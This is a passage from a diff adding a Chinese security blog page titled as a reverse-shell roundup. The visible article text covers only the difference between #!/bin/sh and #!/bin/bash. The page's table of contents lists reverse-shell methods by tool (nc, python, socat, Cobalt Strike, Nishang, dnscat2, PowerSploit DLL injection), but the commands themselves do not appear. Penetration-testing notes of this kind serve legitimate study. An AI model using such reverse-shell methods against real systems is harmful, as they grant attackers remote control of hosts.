+</li>
+<li><p>#!后面的路径一定要正确，不正确会报错(这个文件不会运行,提示路径不存在)。</p>
+</li>
+</ul>
+<h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><ul>
+<li>&#x2F;bin&#x2F;sh指向dash,&#x2F;bin&#x2F;bash指向bash</li>
+<li>dash相当于bash的精简版(dash不能使用let、source 等命令)</li>
+</ul>
+<blockquote>
+<p>有的文章上说,说是 <code>#!/bin/sh</code> 的脚本,出错之后不会继续运行,<code>#!/bin/bash</code>的脚本,出错之后会继续运行,我在Ubuntu上试了一下…<code>#!/bin/sh</code> 的脚本还是继续运行了;</p>
+<p>若是想出错之后停止运行,在<code>#!</code>行之后添加一行<code>set -e</code>,这样出错之后脚本就会停止了</p>
+</blockquote>
+<hr>
+<p>GNU&#x2F;Linux操作系统中的**&#x2F;bin&#x2F;sh<strong>本是</strong>bash (Bourne-Again Shell)** 的符号链接，但鉴于<strong>bash</strong>过于复杂，有人把<strong>bash</strong>从NetBSD移植到Linux并更名为<strong>dash (Debian Almquist Shell)<strong>，并建议将</strong>&#x2F;bin&#x2F;sh</strong>指向它，以获得更快的脚本执行速度。Dash Shell 比Bash Shell小的多，符合POSIX标准。</p>
+<p>Ubuntu继承了Debian，所以从<strong>Ubuntu 6.10</strong>开始默认是Dash Shell。</p>
+<p>所以也就是在<strong>Ubuntu中可以认为&#x2F;bin&#x2F;sh就是&#x2F;bin&#x2F;dash</strong>, 如果打算使用bash, 可直接将&#x2F;bin&#x2F;sh软链接到&#x2F;bin&#x2F;bash.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@b3fe92a89f30:/<span class="comment"># ll -h /bin/sh /bin/bash</span></span><br><span class="line">-rwxr-xr-x 4 root root 1.2M Feb 25 12:03 /bin/bash*</span><br><span class="line">lrwxrwxrwx 1 root root    4 Jul 18  2019 /bin/sh -&gt; dash*</span><br></pre></td></tr></table></figure>
+
+<p>应该说，**&#x2F;bin&#x2F;sh<strong>与</strong>&#x2F;bin&#x2F;bash<strong>虽然大体上没什么区别，但仍存在不同的标准。标记为</strong>#!&#x2F;bin&#x2F;sh<strong>的脚本不应使用任何</strong>POSIX<strong>没有规定的特性 (如</strong>let<strong>等命令, 但</strong>#!&#x2F;bin&#x2F;bash<strong>可以)。Debian曾经采用</strong>&#x2F;bin&#x2F;bash<strong>更改</strong>&#x2F;bin&#x2F;dash<strong>，目的使用更少的磁盘空间、提供较少的功能、获取更快的速度。但是后来经过shell脚本测试存在运行问题。因为原先在</strong>bash shell<strong>下可以运行的shell script (shell 脚本)，在</strong>&#x2F;bin&#x2F;sh**下还是会出现一些意想不到的问题，不是100%的兼用。</p>
+<p>上面可以这样理解，使用<strong>man sh</strong>命令和<strong>man bash</strong>命令去观察，可以发现<strong>sh</strong>本身就是<strong>dash</strong>，也就更好的说明集成Debian系统之后的更改。</p>
+<blockquote>
+<p>在Ubuntu上,&#x2F;bin&#x2F;sh类似&#x2F;bin&#x2F;bash的精简版,有不少功能不能用,Ubuntu默认是&#x2F;bin&#x2F;bash</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/tags/%E5%AE%89%E5%85%A8/">安全</a></li>
+        
+          <li><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li>
+        
+          <li><a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95">备忘录</a></li>
+        
+          <li><a href="/archives/">所有文章</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E6%B1%87%E6%80%BB"><span class="toc-number">1.</span> <span class="toc-text">反弹shell汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bash"><span class="toc-number">1.1.</span> <span class="toc-text">bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NatCat-nc"><span class="toc-number">1.2.</span> <span class="toc-text">NatCat(nc)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec"><span class="toc-number">1.3.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powercat"><span class="toc-number">1.4.</span> <span class="toc-text">powercat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#telnet"><span class="toc-number">1.5.</span> <span class="toc-text">telnet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python"><span class="toc-number">1.6.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-number">1.7.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#perl"><span class="toc-number">1.8.</span> <span class="toc-text">perl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ruby"><span class="toc-number">1.9.</span> <span class="toc-text">ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java"><span class="toc-number">1.10.</span> <span class="toc-text">java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go"><span class="toc-number">1.11.</span> <span class="toc-text">go</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gcc-c"><span class="toc-number">1.12.</span> <span class="toc-text">gcc(c)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#g-c"><span class="toc-number">1.13.</span> <span class="toc-text">g++(c++)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#openssl%EF%BC%88%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-number">1.14.</span> <span class="toc-text">openssl（加密反弹shell）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lua"><span class="toc-number">1.15.</span> <span class="toc-text">lua</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#awk"><span class="toc-number">1.16.</span> <span class="toc-text">awk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gawk"><span class="toc-number">1.17.</span> <span class="toc-text">gawk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socat"><span class="toc-number">1.18.</span> <span class="toc-text">socat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcp"><span class="toc-number">1.18.0.1.</span> <span class="toc-text">tcp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#udp"><span class="toc-number">1.18.0.2.</span> <span class="toc-text">udp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF"><span class="toc-number">1.19.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cobalt-strike"><span class="toc-number">1.20.</span> <span class="toc-text">Cobalt strike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nishang%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.21.</span> <span class="toc-text">Nishang反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-TCP-Shell"><span class="toc-number">1.21.0.1.</span> <span class="toc-text">Reverse TCP Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-UDP-Shell"><span class="toc-number">1.21.0.2.</span> <span class="toc-text">Reverse UDP Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-ICMP-Shell"><span class="toc-number">1.21.0.3.</span> <span class="toc-text">Reverse ICMP Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89powershell%E5%87%BD%E6%95%B0%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.22.</span> <span class="toc-text">自定义powershell函数反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dnscat2-%E5%8F%8D%E5%BC%B9DNS-shell"><span class="toc-number">1.23.</span> <span class="toc-text">dnscat2 反弹DNS shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%88%E8%AF%A6%E6%83%85%EF%BC%89"><span class="toc-number">1.24.</span> <span class="toc-text">补充（详情）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Empire-%E7%BB%93%E5%90%88office%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.24.0.1.</span> <span class="toc-text">Empire 结合office反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8office-OLE%E5%AF%B9%E8%B1%A1%E6%8F%92%E5%85%A5bat%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.24.0.2.</span> <span class="toc-text">利用office OLE对象插入bat文件反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerSploit-DLL%E6%B3%A8%E5%85%A5%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.24.0.3.</span> <span class="toc-text">PowerSploit DLL注入反弹shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">实现交互式shell的几种方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#python-pty"><span class="toc-number">2.1.</span> <span class="toc-text">python pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7nc%E4%B8%BA%E4%BA%A4%E4%BA%92shell"><span class="toc-number">2.2.</span> <span class="toc-text">升级nc为交互shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8socat"><span class="toc-number">2.3.</span> <span class="toc-text">使用socat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#script%E8%8E%B7%E5%8F%96pty"><span class="toc-number">2.4.</span> <span class="toc-text">script获取pty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8ELinux%E4%B8%AD-bin-bash%E5%92%8C-bin-sh%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.5.</span> <span class="toc-text">小知识点总结——关于Linux中#!&#x2F;bin&#x2F;bash和#!&#x2F;bin&#x2F;sh的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">#!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%BA%E5%88%AB"><span class="toc-number">2.5.0.2.</span> <span class="toc-text">区别</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&text=反弹shell"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&is_video=false&description=反弹shell"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=反弹shell&body=Check out this article: https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&title=反弹shell"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&name=反弹shell&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ytcenter.github.io/2023/05/04/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/&t=反弹shell"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    YangTu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/tags/%E5%AE%89%E5%85%A8/">安全</a></li><!--
+     --><!--
+       --><li><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li><!--
+     --><!--
+       --><li><a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95">备忘录</a></li><!--
+     --><!--
+       --><li><a href="/archives/">所有文章</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
